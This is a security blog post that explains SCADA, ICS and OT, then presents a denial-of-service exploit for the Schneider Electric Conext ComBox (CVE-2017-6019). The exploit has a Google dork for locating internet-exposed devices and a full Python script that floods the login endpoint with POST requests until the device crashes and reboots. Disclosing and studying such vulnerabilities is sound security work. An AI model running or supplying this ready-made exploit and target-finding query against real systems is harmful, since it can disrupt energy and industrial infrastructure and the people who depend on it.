---
category: 'blog'
cover: './cover.jpg'
title: 'Schneider Electric - ComBox Exploitation'
description: 'Exploitation on SCADA/ICS/IoT device running in critical infrastructures'
date: '2019-11-13'
tags: ['Exploitation']
published: true
---

_Exploitation on SCADA/ICS/OT device running in critical infrastructures_.

**What is SCADA, ICS or OT?**

![Critical Infrastructure](./cover.jpg)

**SCADA**: "SCADA is an acronym for supervisory control and data acquisition, a computer system for gathering and analyzing real time data. SCADA systems are used to monitor and control a plant or equipment in industries such as telecommunications, water and waste control, energy, oil and gas refining and transportation."

**ICS**: "Industrial control system (ICS) is a general term that encompasses several types of control systems and associated instrumentation used for industrial process control."

**OT**: "Operational Technology – the hardware and software dedicated to detecting or causing changes in physical processes through direct monitoring and/or control of physical devices such as valves, pumps, etc."

---

**Conext ComBox - Denial of Service (HTTP-POST)**

**Description**: The exploit cause the device to self-reboot, constituting a denial of service.

**Google Dork**: `"Conext ComBox" + "JavaScript was not detected" /OR/ "Conext ComBox" + "Recover Lost Password"`

**Exploit Author**: Mark Liapustin & Arik Kublanov

**Vendor Homepage**: http://solar.schneider-electric.com/product/conext-combox/

**Software Link**: http://cdn.solar.schneider-electric.com/wp-content/uploads/2016/06/conext-combox-data-sheet-20160624.pdf

**CVE**: CVE-2017-6019

**Exploit Code**:

```
import subprocess
import os
import sys
import time
import socket
# =========================================================

print 'Usage: python ComBoxDos.py IP PORT'
print 'Number of arguments:', len(sys.argv), 'arguments.'
print 'Argument List:', str(sys.argv)

print "ComBox Denial of Service via HTTP-POST Request"
global cmdosip
cmdosip = str(sys.argv[1])
port = int(sys.argv[2])
print "[!] The script will cause the Conext ComBox device to crash and to reboot itself."
		
print "Executing...\n\n\n"
for i in range(1, 1000):
  try:
	cmdosdir = "login.cgi?login_username=Nation-E&login_password=DOS&submit=Log+In"
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((cmdosip, port))
	print "[+] Sent HTTP POST Request to: " + cmdosip + " with /" + cmdosdir + " HTTP/1.1"
	s.send("POST /" + cmdosdir + " HTTP/1.1\r\n")
	s.send("Host: " + cmdosip + "\r\n\r\n")
	s.close()
  except: 
     pass
```
